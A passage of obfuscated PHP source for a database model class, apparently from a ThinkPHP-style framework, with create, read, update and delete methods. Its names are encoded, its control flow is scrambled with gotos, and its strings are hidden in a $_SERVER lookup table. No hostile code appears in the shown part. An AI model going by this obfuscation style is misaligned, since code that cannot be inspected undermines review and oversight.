= array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\x6f\x72\x64\x65\162", "\x61\x6c\151\x61\163", "\x68\141\166\x69\x6e\147", "\x67\162\x6f\x75\x70", "\x6c\x6f\x63\x6b", "\144\x69\163\x74\151\x6e\x63\164", "\x61\x75\x74\x6f", "\x66\151\x6c\x74\145\x72", "\166\141\154\x69\x64\x61\164\x65", "\x72\x65\x73\165\x6c\x74", "\142\x69\x6e\144", "\164\157\153\x65\x6e"); public function __construct($DËµ°Šö = '', $CÍÁ›™Ì° = '', $e¿šº—©İ³ = '') { $d´´¯œ’Ì =& $_SERVER[Â€Á›¨õ]; $this->_initialize(); if (!empty($DËµ°Šö)) { if (strpos($DËµ°Šö, $d´´¯œ’Ì[94])) { list($this->dbName, $this->name) = explode($d´´¯œ’Ì[94], $DËµ°Šö); } else { $this->name = $DËµ°Šö; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($CÍÁ›™Ì°)) { $this->tablePrefix = $d´´¯œ’Ì[33]; } elseif ($d´´¯œ’Ì[33] != $CÍÁ›™Ì°) { $this->tablePrefix = $CÍÁ›™Ì°; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($d´´¯œ’Ì[240]); } $this->db(0, empty($this->connection) ? $e¿šº—©İ³ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $bÛ¸©©ğ’¼ =& $_SERVER[Â€Á›¨õ]; if (empty($this->fields)) { if (think_config($bÛ¸©©ğ’¼[241])) { $F¹£ŸíÑÊ = $this->dbName ? $this->dbName : think_config($bÛ¸©©ğ’¼[242]); $a‰±‚ã‡¯ = think_var_cache($bÛ¸©©ğ’¼[243] . strtolower(get_path_this($F¹£ŸíÑÊ) . $bÛ¸©©ğ’¼[94] . $this->name)); if ($a‰±‚ã‡¯) { $fÌÒ£Çîºß = think_config($bÛ¸©©ğ’¼[244]); if (empty($fÌÒ£Çîºß) || $a‰±‚ã‡¯[$bÛ¸©©ğ’¼[245]] == $fÌÒ£Çîºß) { $this->fields = $a‰±‚ã‡¯; return; } } } $this->flush(); } } public function flush() { goto Bİ»³‚ˆ…¡; D±‡—ßØšŒ: if (!$aâÛÔÙ™ ˆ) { return !1; } $this->fields = array_keys($aâÛÔÙ™ ˆ); $this->fields[$C‡‹îè£‰¡[246]] = !1; goto cèÆ“å†Í; Eï ¦ƒ½’ç: if (think_config($C‡‹îè£‰¡[241])) { $CÙ˜‚ÑØ´ò = $this->dbName ? $this->dbName : think_config($C‡‹îè£‰¡[242]); think_var_cache($C‡‹îè£‰¡[243] . strtolower(get_path_this($CÙ˜‚ÑØ´ò) . $C‡‹îè£‰¡[94] . $this->name), $this->fields); } goto C‡šŒŠÈÇÎ; Bİ»³‚ˆ…¡: $C‡‹îè£‰¡ =& $_SERVER[Â€Á›¨õ]; $this->db->setModel($this->name); $aâÛÔÙ™ ˆ = $this->db->getFields($this->getTableName()); goto D±‡—ßØšŒ; cèÆ“å†Í: foreach ($aâÛÔÙ™ ˆ as $DÀòá‚¦¥ => $Bëƒ·»å¼) { $C»¸¥„Ôˆ[$DÀòá‚¦¥] = $Bëƒ·»å¼[$C‡‹îè£‰¡[29]]; if ($Bëƒ·»å¼[$C‡‹îè£‰¡[36]]) { $this->fields[$C‡‹îè£‰¡[247]] = $DÀòá‚¦¥; if ($Bëƒ·»å¼[$C‡‹îè£‰¡[39]]) { $this->fields[$C‡‹îè£‰¡[246]] = !0; } } } $this->fields[$C‡‹îè£‰¡[248]] = $C»¸¥„Ôˆ; if (think_config($C‡‹îè£‰¡[244])) { $this->fields[$C‡‹îè£‰¡[245]] = think_config($C‡‹îè£‰¡[244]); } goto Eï ¦ƒ½’ç; C‡šŒŠÈÇÎ: } public function switchModel($f­³”ºèƒº, $f¤åÚÖêğ = array()) { $dœ™õÃºôĞ =& $_SERVER[Â€Á›¨õ]; $dˆœÔò«»ª = ucwords(strtolower($f­³”ºèƒº)) . $dœ™õÃºôĞ[249]; if (!class_exists($dˆœÔò«»ª)) { think_exception($dˆœÔò«»ª . think_lang($dœ™õÃºôĞ[250])); } $this->_extModel = new $dˆœÔò«»ª($this->name); if (!empty($f¤åÚÖêğ)) { foreach ($f¤åÚÖêğ as $b¨Şù¢´¹ô) { $this->_extModel->setProperty($b¨Şù¢´¹ô, $this->{$b¨Şù¢´¹ô}); } } return $this->_extModel; } public function __set($DÙöåŠÃÜ, $F®Ùğí¶„) { $this->data[$DÙöåŠÃÜ] = $F®Ùğí¶„; } public function __get($AŒ”¶İù™Ô) { return isset($this->data[$AŒ”¶İù™Ô]) ? $this->data[$AŒ”¶İù™Ô] : null; } public function __isset($F˜õ·İ‰×ˆ) { return isset($this->data[$F˜õ·İ‰×ˆ]); } public function __unset($AèóÈ˜İÄó) { unset($this->data[$AèóÈ˜İÄó]); } public function __call($dç·•àµ…, $aˆÈà±Ê·‡) { $b•è®éÅŞ‚ =& $_SERVER[Â€Á›¨õ]; if (in_array(strtolower($dç·•àµ…), $this->methods, !0)) { $this->options[strtolower($dç·•àµ…)] = $aˆÈà±Ê·‡[0]; return $this; } elseif (in_array(strtolower($dç·•àµ…), array($b•è®éÅŞ‚[251], $b•è®éÅŞ‚[252], $b•è®éÅŞ‚[253], $b•è®éÅŞ‚[254], $b•è®éÅŞ‚[255]), !0)) { $CäêÜŞï½ = isset($aˆÈà±Ê·‡[0]) ? $aˆÈà±Ê·‡[0] : $b•è®éÅŞ‚[182]; $CäêÜŞï½ = $this->db->parseKey($CäêÜŞï½); return $this->getField(strtoupper($dç·•àµ…) . $b•è®éÅŞ‚[256] . $CäêÜŞï½ . $b•è®éÅŞ‚[257] . $dç·•àµ…, $b•è®éÅŞ‚[251]); } elseif (strtolower(substr($dç·•àµ…, 0, 5)) == $b•è®éÅŞ‚[258]) { $CäêÜŞï½ = think_parse_name(substr($dç·•àµ…, 5)); $CÊÜ½„“¨[$CäêÜŞï½] = $aˆÈà±Ê·‡[0]; return $this->where($CÊÜ½„“¨)->find(); } elseif (strtolower(substr($dç·•àµ…, 0, 10)) == $b•è®éÅŞ‚[259]) { $e¢•²×”§ = think_parse_name(substr($dç·•àµ…, 10)); $CÊÜ½„“¨[$e¢•²×”§] = $aˆÈà±Ê·‡[0]; return $this->where($CÊÜ½„“¨)->getField($aˆÈà±Ê·‡[1]); } elseif (isset($this->_scope[$dç·•àµ…])) { return $this->scope($dç·•àµ…, $aˆÈà±Ê·‡[0]); } elseif (method_exists($this, $dç·•àµ…)) { array_unshift($aˆÈà±Ê·‡, $dç·•àµ…); return call_user_func_array(array($this, $b•è®éÅŞ‚[260]), $aˆÈà±Ê·‡); } else { return call_user_func_array(array(parent, $dç·•àµ…), $aˆÈà±Ê·‡); } } protected function call() { goto A·ñâ¨ñšˆ; eÍÖÀŠÚ‡: $E‚Ä¾é‰ÜÈ = $FÈ®ºË¼Â; if (is_array($FÈ®ºË¼Â)) { $E‚Ä¾é‰ÜÈ = $FÈ®ºË¼Â[1]; $FÈ®ºË¼Â = $FÈ®ºË¼Â[0]; } $Bê¹ÒìóŠÚ = count($F“­™È‚Äï) - 1; goto bšùô×ÑÅ; bšùô×ÑÅ: if (isset($F“­™È‚Äï[$Bê¹ÒìóŠÚ]) && $F“­™È‚Äï[$Bê¹ÒìóŠÚ] === $FÈ®ºË¼Â) { think_exception(__CLASS__ . $a‘óëŞ–“‡[4] . $FÈ®ºË¼Â . think_lang($a‘óëŞ–“‡[261])); return; } $F“­™È‚Äï[] = $FÈ®ºË¼Â; if (method_exists($this, $a‘óëŞ–“‡[262])) { $C©êß×†“Ë = call_user_func_array(array($this, $a‘óëŞ–“‡[263]), array($E‚Ä¾é‰ÜÈ, $F“­™È‚Äï)); if (!is_null($C©êß×†“Ë) && $C©êß×†“Ë !== !1) { return $C©êß×†“Ë; } } goto EÊ‘ƒ›¾’Ñ; EÊ‘ƒ›¾’Ñ: $F½¾³¨¬İÄ = call_user_func_array(array($this, $FÈ®ºË¼Â), $F“­™È‚Äï); if (method_exists($this, $a‘óëŞ–“‡[264])) { $C©êß×†“Ë = call_user_func_array(array($this, $a‘óëŞ–“‡[265]), array($E‚Ä¾é‰ÜÈ, $F“­™È‚Äï, $F½¾³¨¬İÄ)); if ($C©êß×†“Ë) { return $C©êß×†“Ë; } } return $F½¾³¨¬İÄ; goto fùŞ¥Î´±¶; A·ñâ¨ñšˆ: $a‘óëŞ–“‡ =& $_SERVER[Â€Á›¨õ]; $F“­™È‚Äï = func_get_args(); $FÈ®ºË¼Â = array_shift($F“­™È‚Äï); goto eÍÖÀŠÚ‡; fùŞ¥Î´±¶: } protected function _initialize() { } protected function _facade($A‘•˜ï»¥Â) { $Bê×ª“Š­ =& $_SERVER[Â€Á›¨õ]; if (!empty($this->fields)) { foreach ($A‘•˜ï»¥Â as $eÇòš÷ã² => $D¾œ½ï”ê¶) { if (is_array($this->fields) && !in_array($eÇòš÷ã², $this->fields, !0)) { unset($A‘•˜ï»¥Â[$eÇòš÷ã²]); } elseif (is_scalar($D¾œ½ï”ê¶)) { $this->_parseType($A‘•˜ï»¥Â, $eÇòš÷ã²); } } } if (!empty($this->options[$Bê×ª“Š­[266]])) { $A‘•˜ï»¥Â = array_map($this->options[$Bê×ª“Š­[266]], $A‘•˜ï»¥Â); unset($this->options[$Bê×ª“Š­[266]]); } $this->_beforeWrite($A‘•˜ï»¥Â); return $A‘•˜ï»¥Â; } protected function _beforeWrite(&$dÉ× åğÀí) { } public function add($e”ÄÀƒ÷½ = '', $bäô‚Ò§¥ = array(), $e÷É¨Õâƒ = false) { goto E«¨œ¯·À•; E«¨œ¯·À•: if (empty($e”ÄÀƒ÷½)) { if (!empty($this->data)) { $e”ÄÀƒ÷½ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Â€Á›¨õ][267]); return !1; } } $bäô‚Ò§¥ = $this->_parseOptions($bäô‚Ò§¥); $e”ÄÀƒ÷½ = $this->_facade($e”ÄÀƒ÷½); goto fİ¡äÑã›; fİ¡äÑã›: if (!1 === $this->_beforeInsert($e”ÄÀƒ÷½, $bäô‚Ò§¥)) { return !1; } $Bâì‰ŒöÓ„ = $this->db->insert($e”ÄÀƒ÷½, $bäô‚Ò§¥, $e÷É¨Õâƒ); if (!1 !== $Bâì‰ŒöÓ„) { $eÎÍŒ–‹¹ = $this->getLastInsID(); if ($eÎÍŒ–‹¹) { $e”ÄÀƒ÷½[$this->getPk()] = $eÎÍŒ–‹¹; $this->_after_insert($e”ÄÀƒ÷½, $bäô‚Ò§¥); return $eÎÍŒ–‹¹; } $this->_after_insert($e”ÄÀƒ÷½, $bäô‚Ò§¥); } goto A¸»ùè²; A¸»ùè²: return $Bâì‰ŒöÓ„; goto DÜĞ¢í–î; DÜĞ¢í–î: } protected function _beforeInsert(&$a”øÂÛ†Ú, $D†íèëÛ) { } protected function _after_insert($Aõ‚Øè±ôì, $C“ƒğŒÎÉˆ) { } public function addAll($cœÜ·ó›, $A¥Ì‡ÆÆµğ = array(), $eãâˆãºò• = false) { goto AëÒ®˜‰á; dÄÎğŸ§ô¿: foreach ($cœÜ·ó› as $A¿™ƒÄøÙë => $Aõ½Ï´„á¥) { $cœÜ·ó›[$A¿™ƒÄøÙë] = $this->_facade($Aõ½Ï´„á¥); } if (method_exists($this->db, $d‰ßƒ†ÛŞ­[268])) { $dé—èë˜¿ = $this->db->insertAll($cœÜ·ó›, $A¥Ì‡ÆÆµğ, $eãâˆãºò•); } else { $this->startTrans(); foreach ($cœÜ·ó› as $A¿™ƒÄøÙë => $Aõ½Ï´„á¥) { $dé—èë˜¿ = $this->db->insert($Aõ½Ï´„á¥, $A¥Ì‡ÆÆµğ, $eãâˆãºò•); } $this->commit(); } if (!1 !== $dé—èë˜¿) { $D†¢®íÚöÅ = $this->getLastInsID(); if ($D†¢®íÚöÅ) { return $D†¢®íÚöÅ; } } goto DÆ£¾¦Ş¶é; AëÒ®˜‰á: $d‰ßƒ†ÛŞ­ =& $_SERVER[Â€Á›¨õ]; if (empty($cœÜ·ó›)) { $this->error = think_lang($d‰ßƒ†ÛŞ­[267]); return !1; } $A¥Ì‡ÆÆµğ = $this->_parseOptions($A¥Ì‡ÆÆµğ); goto dÄÎğŸ§ô¿; DÆ£¾¦Ş¶é: return $dé—èë˜¿; goto aµ«Øİğê‹; aµ«Øİğê‹: } public function selectAdd($Câï­×‘Áİ = '', $F±ÎÖÃî—½ = '', $FØ…Èá‘»¯ = array()) { $d›­·±¡ =& $_SERVER[Â€Á›¨õ]; $FØ…Èá‘»¯ = $this->_parseOptions($FØ…Èá‘»¯); if (!1 === ($CÍôŠ†˜³ = $this->db->selectInsert($Câï­×‘Áİ ? $Câï­×‘Áİ : $FØ…Èá‘»¯[$d›­·±¡[269]], $F±ÎÖÃî—½ ? $F±ÎÖÃî—½ : $this->getTableName(), $FØ…Èá‘»¯))) { $this->error = think_lang($d›­·±¡[270]); return !1; } else { return $CÍôŠ†˜³; } } public function save($Eæ¸ÈĞ×†â = '', $D¤›°Ç”—« = array()) { goto fŸÓòÌÍ¶ô; e»‹¸Ñ¯˜¸: if (is_array($D¤›°Ç”—«[$f®‘õ¤“™—[271]]) && isset($D¤›°Ç”—«[$f®‘õ¤“™—[271]][$aŒ¢˜ÁŸˆ‡])) { $CÁôÊËÌ“ = $D¤›°Ç”—«[$f®‘õ¤“™—[271]][$aŒ¢˜ÁŸˆ‡]; } if (!1 === $this->_beforeUpdate($Eæ¸ÈĞ×†â, $D¤›°Ç”—«)) { return !1; } $EÑçšãƒ†ñ = $this->db->update($Eæ¸ÈĞ×†â, $D¤›°Ç”—«); goto aÒ‡·ğÁÚ; fŸÓòÌÍ¶ô: $f®‘õ¤“™— =& $_SERVER[Â€Á›¨õ]; if (empty($Eæ¸ÈĞ×†â)) { if (!empty($this->data)) { $Eæ¸ÈĞ×†â = $this->data; $this->data = array(); } else { $this->error = think_lang($f®‘õ¤“™—[267]); return !1; } } $Eæ¸ÈĞ×†â = $this->_facade($Eæ¸ÈĞ×†â); goto F—ƒ«¾‹…; F—ƒ«¾‹…: $D¤›°Ç”—« = $this->_parseOptions($D¤›°Ç”—«); $aŒ¢˜ÁŸˆ‡ = $this->getPk(); if (!isset($D¤›°Ç”—«[$f®‘õ¤“™—[271]])) { if (isset($Eæ¸ÈĞ×†â[$aŒ¢˜ÁŸˆ‡])) { $fÆŠˆ¸÷ˆ°[$aŒ¢˜ÁŸˆ‡] = $Eæ¸ÈĞ×†â[$aŒ¢˜ÁŸˆ‡]; $D¤›°Ç”—«[$f®‘õ¤“™—[271]] = $fÆŠˆ¸÷ˆ°; unset($Eæ¸ÈĞ×†â[$aŒ¢˜ÁŸˆ‡]); } else { $this->error = think_lang($f®‘õ¤“™—[270]); return !1; } } goto e»‹¸Ñ¯˜¸; aÒ‡·ğÁÚ: if (!1 !== $EÑçšãƒ†ñ) { if (isset($CÁôÊËÌ“)) { $Eæ¸ÈĞ×†â[$aŒ¢˜ÁŸˆ‡] = $CÁôÊËÌ“; } $this->_afterUpdate($Eæ¸ÈĞ×†â, $D¤›°Ç”—«); } return $EÑçšãƒ†ñ; goto cê«Õåèè; cê«Õåèè: } protected function _beforeUpdate(&$FôÙÙø¯×õ, $d½œ˜Í¡´ç) { } protected function _afterUpdate($bÉÒ¼‚Æ‡„, $Dï„É••éè) { } public function delete($d©´´ˆîÄ = array()) { goto bö…æØ¬ğ¥; bö…æØ¬ğ¥: $eŒŞÍÔñá =& $_SERVER[Â€Á›¨õ]; if (empty($d©´´ˆîÄ) && empty($this->options[$eŒŞÍÔñá[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $cÏ¿°µŸÚ = $this->getPk(); goto e²–Ú‡¹º; e²–Ú‡¹º: if (is_numeric($d©´´ˆîÄ) || is_string($d©´´ˆîÄ)) { if (strpos($d©´´ˆîÄ, $eŒŞÍÔñá[47])) { $DÌ­ÒÑ‹[$cÏ¿°µŸÚ] = array($eŒŞÍÔñá[272], $d©´´ˆîÄ); } else { $DÌ­ÒÑ‹[$cÏ¿°µŸÚ] = $d©´´ˆîÄ; } $this->options[$eŒŞÍÔñá[271]] = $DÌ­ÒÑ‹; } $d©´´ˆîÄ = $this->_parseOptions(); if (is_array($d©´´ˆîÄ[$eŒŞÍÔñá[271]]) && isset($d©´´ˆîÄ[$eŒŞÍÔñá[271]][$cÏ¿°µŸÚ])) { $Aá‹½‹Ãß¹ = $d©´´ˆîÄ[$eŒŞÍÔñá[271]][$cÏ¿°µŸÚ]; } goto DŞÔ‚¶§½ë; DŞÔ‚¶§½ë: $a¦å°äİ‚õ = $this->db->delete($d©´´ˆîÄ); if (!1 !== $a¦å°äİ‚õ) { $d×¼ÏÍš = array(); if (isset($Aá‹½‹Ãß¹)) { $d×¼ÏÍš[$cÏ¿°µŸÚ] = $Aá‹½‹Ãß¹; } $this->_after_delete($d×¼ÏÍš, $d©´´ˆîÄ); } return $a¦å°äİ‚õ; goto AÖõÙ¶ùµŒ; AÖõÙ¶ùµŒ: } protected function _after_delete($a˜ÂÂˆê×ˆ, $FÍÄ‘„è È) { } public function select($Fô·£“ĞÑ = array()) { goto AƒöÏÕÌ‰Ğ; d‡Š­Úè¹±: $this->_afterSelect($aÔç÷©¯, $Fô·£“ĞÑ); return $aÔç÷©¯; goto cÇ†ëÃ¡Î–; AƒöÏÕÌ‰Ğ: $d¼­œ¾¯÷® =& $_SERVER[Â€Á›¨õ]; if (is_string($Fô·£“ĞÑ) || is_numeric($Fô·£“ĞÑ)) { $E¾àê™ØØ› = $this->getPk(); if (strpos($Fô·£“ĞÑ, $d¼­œ¾¯÷®[47])) { $E³çÊÜ[$E¾àê™ØØ›] = array($d¼­œ¾¯÷®[272], $Fô·£“ĞÑ); } else { $E³çÊÜ[$E¾àê™ØØ›] = $Fô·£“ĞÑ; } $this->options[$d¼­œ¾¯÷®[271]] = $E³çÊÜ; } elseif (!1 === $Fô·£“ĞÑ) { $Fô·£“ĞÑ = $this->_parseOptions(); return $d¼­œ¾¯÷®[273] . $this->db->buildSelectSql($Fô·£“ĞÑ) . $d¼­œ¾¯÷®[274]; } $Fô·£“ĞÑ = $this->_parseOptions(); goto F‘µºÇ’Âõ; F‘µºÇ’Âõ: $aÔç÷©¯ = $this->db->select($Fô·£“ĞÑ); if (!1 === $aÔç÷©¯) { return !1; } if (empty($aÔç÷©¯)) { return null; } goto d‡Š­Úè¹±; cÇ†ëÃ¡Î–: } protected function _afterSelect(&$e‡Ê’½ç´, $F¡ğ à‹¨’) { } public function buildSql($e‹Ä’òá = array()) { $e‰Ñ‡””»Õ =& $_SERVER[Â€Á›¨õ]; $e‹Ä’òá = $this->_parseOptions($e‹Ä’òá); return $e‰Ñ‡””»Õ[273] . $this->db->buildSelectSql($e‹Ä’òá) . $e‰Ñ‡””»Õ[274]; } public function optionsValue($d…öÉÀÊ¿Š = null) { if (is_null($d…öÉÀÊ¿Š)) { return $this->options; } elseif (is_array($d…öÉÀÊ¿Š)) { $this->options = array_merge($this->options, $d…öÉÀÊ¿Š); } } protected function _parseOptions($fİº¶ê¥Ÿ = array()) { goto cíÓ¾ª“—Õ; a‚Áä¶ÃÀ÷: if (!isset($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[275]])) { $fİº¶ê¥Ÿ[$e–„‚Œ‡ î[275]] = $this->getTableName(); $b–•ÈÈã¯ë = $this->fields; } else { $b–•ÈÈã¯ë = $this->getDbFields(); } if (!empty($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[276]])) { $fİº¶ê¥Ÿ[$e–„‚Œ‡ î[275]] .= $e–„‚Œ‡ î[50] . $fİº¶ê¥Ÿ[$e–„‚Œ‡ î[276]]; } $fİº¶ê¥Ÿ[$e–„‚Œ‡ î[277]] = $this->name; goto b’ğ—Ü™Â; cíÓ¾ª“—Õ: $e–„‚Œ‡ î =& $_SERVER[Â€Á›¨õ]; if (is_array($fİº¶ê¥Ÿ)) { $fİº¶ê¥Ÿ = array_merge($this->options, $fİº¶ê¥Ÿ); } $this->options = array(); goto a‚Áä¶ÃÀ÷; b’ğ—Ü™Â: if (isset($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[271]]) && is_array($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[271]]) && !empty($b–•ÈÈã¯ë) && !isset($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[278]]) && !isset($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[275]])) { foreach ($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[271]] as $aÂ¥Ü¼¨½ => $d‹½‰À ”) { $aÂ¥Ü¼¨½ = trim($aÂ¥Ü¼¨½); if (in_array($aÂ¥Ü¼¨½, $b–•ÈÈã¯ë, !0)) { if (is_scalar($d‹½‰À ”)) { $this->_parseType($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[271]], $aÂ¥Ü¼¨½); } } elseif (!is_numeric($aÂ¥Ü¼¨½) && $e–„‚Œ‡ î[70] != substr($aÂ¥Ü¼¨½, 0, 1) && !1 === strpos($aÂ¥Ü¼¨½, $e–„‚Œ‡ î[94]) && !1 === strpos($aÂ¥Ü¼¨½, $e–„‚Œ‡ î[256]) && !1 === strpos($aÂ¥Ü¼¨½, $e–„‚Œ‡ î[279]) && !1 === strpos($aÂ¥Ü¼¨½, $e–„‚Œ‡ î[280])) { unset($fİº¶ê¥Ÿ[$e–„‚Œ‡ î[271]][$aÂ¥Ü¼¨½]); } } } $this->_options_filter($fİº¶ê¥Ÿ); return $fİº¶ê¥Ÿ; goto CµÑ”´áÈ©; CµÑ”´áÈ©: } protected function _options_filter(&$Bö‹äÎ˜ßõ) { } protected function _parseType(&$a…˜­ï¿ğ, $bÎäÊ÷Âª) { $c÷Íª¨¿Ñ‹ =& $_SERVER[Â€Á›¨õ]; if (empty($this->options[$c÷Íª¨¿Ñ‹[281]][$c÷Íª¨¿Ñ‹[4] . $bÎäÊ÷Âª])) { $Fé™©£ë¼ì = strtolower($this->fields[$c÷Íª¨¿Ñ‹[248]][$bÎäÊ÷Âª]); if (!1 !== strpos($Fé™©£ë¼ì, $c÷Íª¨¿Ñ‹[282])) { } elseif (!1 === strpos($Fé™©£ë¼ì, $c÷Íª¨¿Ñ‹[283]) && !1 !== strpos($Fé™©£ë¼ì, $c÷Íª¨¿Ñ‹[284])) { $a…˜­ï¿ğ[$bÎäÊ÷Âª] = intval($a…˜­ï¿ğ[$bÎäÊ÷Âª]); } elseif (!1 !== strpos($Fé™©£ë¼ì, $c÷Íª¨¿Ñ‹[285]) || !1 !== strpos($Fé™©£ë¼ì, $c÷Íª¨¿Ñ‹[286])) { $a…˜­ï¿ğ[$bÎäÊ÷Âª] = floatval($a…˜­ï¿ğ[$bÎäÊ÷Âª]); } elseif (!1 !== strpos($Fé™©£ë¼ì, $c÷Íª¨¿Ñ‹[287])) { $a…˜­ï¿ğ[$bÎäÊ÷Âª] = (bool) $a…˜­ï¿ğ[$bÎäÊ÷Âª]; } } } public function find($fƒñá¦Õ“° = array()) { goto Fõé¹Î½ö; Fõé¹Î½ö: $D¸ğèŒñ =& $_SERVER[Â€Á›¨õ]; if (is_numeric($fƒñá¦Õ“°) || is_string($fƒñá¦Õ“°)) { $D¸éŠª­‘´[$this->getPk()] = intval($fƒñá¦Õ“°); $this->options[$D¸ğèŒñ[271]] = $D¸éŠª­‘´; } $this->options[$D¸ğèŒñ[288]] = 1; goto D”Ğ„µø‚Ã; D”Ğ„µø‚Ã: $fƒñá¦Õ“° = $this->_parseOptions(); $CÇ©áåËß = $this->db->select($fƒñá¦Õ“°); if (!1 === $CÇ©áåËß) { return !1; } goto eª†·ŠøÕ; eª†·ŠøÕ: if (empty($CÇ©áåËß)) { return null; } $this->data = $CÇ©áåËß[0]; $this->_afterFind($this->data, $fƒñá¦Õ“°); goto F¯…À—ñ’‚; F¯…À—ñ’‚: if (!empty($this->options[$D¸ğèŒñ[289]])) { return $this->returnResult($this->data, $this->options[$D¸ğèŒñ[289]]); } return $this->data; goto fÀÜ×ã×À®; fÀÜ×ã×À®: } protected function _afterFind(&$BÉŸÁªŠ°Ó, $D®í‰Ê˜Ç±) { } protected function returnResult($C…ËˆöÑö, $B‘ñëŞ›õ = '') { $E®›¥—æˆ =& $_SERVER[Â€Á›¨õ]; if ($B‘ñëŞ›õ) { if (is_callable($B‘ñëŞ›õ)) { return call_user_func($B‘ñëŞ›õ, $C…ËˆöÑö); } switch (strtolower($B‘ñëŞ›õ)) { case $E®›¥—æˆ[290]: return json_encode($C…ËˆöÑö); case $E®›¥—æˆ[291]: return xml_encode($C…ËˆöÑö); } } return $C…ËˆöÑö; } public function parseFieldsMap($F†Æ‘¿ìÉŠ, $E¿ÏŞŒ”Î‹ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $B¾®›¸ß‡ => $EÎç‹²Éæà) { if ($E¿ÏŞŒ”Î‹ == 1) { if (isset($F†Æ‘¿ìÉŠ[$EÎç‹²Éæà])) { $F†Æ‘¿ìÉŠ[$B¾®›¸ß‡] = $F†Æ‘¿ìÉŠ[$EÎç‹²Éæà]; unset($F†Æ‘¿ìÉŠ[$EÎç‹²Éæà]); } } else { if (isset($F†Æ‘¿ìÉŠ[$B¾®›¸ß‡])) { $F†Æ‘¿ìÉŠ[$EÎç‹²Éæà] = $F†Æ‘¿ìÉŠ[$B¾®›¸ß‡]; unset($F†Æ‘¿ìÉŠ[$B¾®›¸ß‡]); } } } } return $F†Æ‘¿ìÉŠ; } public function setField($b· ¾Ó°ñ, $E¤­Ÿé•Úì = '') { if (is_array($b· ¾Ó°ñ)) { $A³ñõÏÓùŠ = $b· ¾Ó°ñ; } else { $A³ñõÏÓùŠ[$b· ¾Ó°ñ] = $E¤­Ÿé•Úì; } return $this->save($A³ñõÏÓùŠ); } public function setAdd($C°‹œ¸Îßê, $f•¿‚• = 1) { $bîÆƒ·ì” =& $_SERVER[Â€Á›¨õ]; $Ešé©îôÔ§ = $C°‹œ¸Îßê . $bîÆƒ·ì”[292] . $f•¿‚•; if ($f•¿‚• < 0) { $Ešé©îôÔ§ = $C°‹œ¸Îßê . $f•¿‚•; } return $this->setField($C°‹œ¸Îßê, array($bîÆƒ·ì”[293], $Ešé©îôÔ§)); } public function getField($EƒÙ¯¡¦, $Fİ—‚¤ê“¹ = null) { $aøùğ¾Â”À =& $_SERVER[Â€Á›¨õ]; $e…”‘Ô®[$aøùğ¾Â”À[269]] = $EƒÙ¯¡¦; $e…”‘Ô® = $this->_parseOptions($e…”‘Ô®); $EƒÙ¯¡¦ = trim($EƒÙ¯¡¦); if (strpos($EƒÙ¯¡¦, $aøùğ¾Â”À[47])) { if (!isset($e…”‘Ô®[$aøùğ¾Â”À[288]])) { $e…”‘Ô®[$aøùğ¾Â”À[288]] = is_numeric($Fİ—‚¤ê“¹) ? $Fİ—‚¤ê“¹ : $aøùğ¾Â”À[33]; } $B‡ÄÎö‰’’ = $this->db->select($e…”‘Ô®); if (!empty($B‡ÄÎö‰’’)) { goto Cóƒ©÷Ñ˜ƒ; E®½ŒØƒçˆ: $AÉÆ¯†Ç‡¯ = array_shift($EƒÙ¯¡¦); $A‚°®×¹¦ˆ = array(); $bæôÙ¿ææ² = count($Fµ·ÑÒ¯®ƒ); goto Bìß™æ’™è; Cóƒ©÷Ñ˜ƒ: $Fµ·ÑÒ¯®ƒ = explode($aøùğ¾Â”À[47], $EƒÙ¯¡¦); $EƒÙ¯¡¦ = array_keys($B‡ÄÎö‰’’[0]); $bè©Â¨ãÈ = array_shift($EƒÙ¯¡¦); goto E®½ŒØƒçˆ; Bìß™æ’™è: foreach ($B‡ÄÎö‰’’ as $cáŠ‘–¨Ö) { $dïØù¢¾Êƒ = $cáŠ‘–¨Ö[$bè©Â¨ãÈ]; if (2 == $bæôÙ¿ææ²) { $A‚°®×¹¦ˆ[$dïØù¢¾Êƒ] = $cáŠ‘–¨Ö[$AÉÆ¯†Ç‡¯]; } else { $A‚°®×¹¦ˆ[$dïØù¢¾Êƒ] = is_string($Fİ—‚¤ê“¹) ? implode($Fİ—‚¤ê“¹, $cáŠ‘–¨Ö) : $cáŠ‘–¨Ö; } } return $A‚°®×¹¦ˆ; goto f¾­’Üø; f¾­’Üø: } } else { if (!0 !== $Fİ—‚¤ê“¹) { $e…”‘Ô®[$aøùğ¾Â”À[288]] = is_numeric($Fİ—‚¤ê“¹) ? $Fİ—‚¤ê“¹ : 1; } if ($Fİ—‚¤ê“¹ === $aøùğ¾Â”À[251]) { unset($e…”‘Ô®[$aøùğ¾Â”À[288]]); } $cáŠ‘–¨Ö = $this->db->select($e…”‘Ô®); if (!empty($cáŠ‘–¨Ö)) { if ($Fİ—‚¤ê“¹ === $aøùğ¾Â”À[251]) { return reset($cáŠ‘–¨Ö[0]); } if (!0 !== $Fİ—‚¤ê“¹ && 1 == $e…”‘Ô®[$aøùğ¾Â”À[288]]) { return reset($cáŠ‘–¨Ö[0]); } foreach ($cáŠ‘–¨Ö as $b‚İõŠÆ•â) { $c±êÕùÍí[] = $b‚İõŠÆ•â[$EƒÙ¯¡¦]; } return $c±êÕùÍí; } } return null; } public function create($aÅ˜à „…› = '', $E“Ôœ¯·ô¡ = '') { goto d‰ÜØ‚; cõÓ›‹ÒÑ: $aÅ˜à „…› = $this->parseFieldsMap($aÅ˜à „…›, 0); $E“Ôœ¯·ô¡ = $E“Ôœ¯·ô¡ ? $E“Ôœ¯·ô¡ : (!empty($aÅ˜à „…›[$this->getPk()]) ? 